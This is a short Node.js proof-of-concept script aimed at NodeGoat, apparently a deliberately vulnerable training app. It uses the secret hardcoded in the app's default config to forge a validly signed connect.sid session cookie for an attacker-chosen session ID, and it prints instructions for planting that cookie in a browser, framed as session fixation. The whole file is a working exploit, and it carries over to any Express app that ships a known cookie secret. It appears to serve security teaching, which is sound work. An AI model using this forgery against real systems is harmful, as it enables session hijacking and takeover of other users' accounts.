// Demonstrates that NodeGoat's session cookie secret is hardcoded and
// publicly known, allowing an attacker to forge a validly-signed session
// cookie for any session ID of their choosing (session fixation).
//
// Usage: node forge-cookie.js
const cookieSignature = require("cookie-signature");

// This value is taken verbatim from config/env/all.js — it is committed
// to source control and identical in every NodeGoat deployment that uses
// the default config, making it public knowledge.
const KNOWN_SECRET = "session_cookie_secret_key_here";

// The attacker picks this session ID themselves, in advance.
const ATTACKER_CHOSEN_SESSION_ID = "attacker-fixed-session-12345";

const signed = cookieSignature.sign(ATTACKER_CHOSEN_SESSION_ID, KNOWN_SECRET);

// express-session cookies are stored URL-encoded with an "s:" prefix
// before the signed value.
const cookieValue = "s%3A" + encodeURIComponent(signed).replace(/%2C/g, ",");

console.log("Attacker-chosen session ID:", ATTACKER_CHOSEN_SESSION_ID);
console.log("Forged signed cookie value (connect.sid):");
console.log(cookieValue);
console.log("");
console.log("To use: open browser dev tools on http://localhost:4000,");
console.log("go to Application/Storage > Cookies, and set connect.sid to");
console.log("the value above (or use document.cookie in the console).");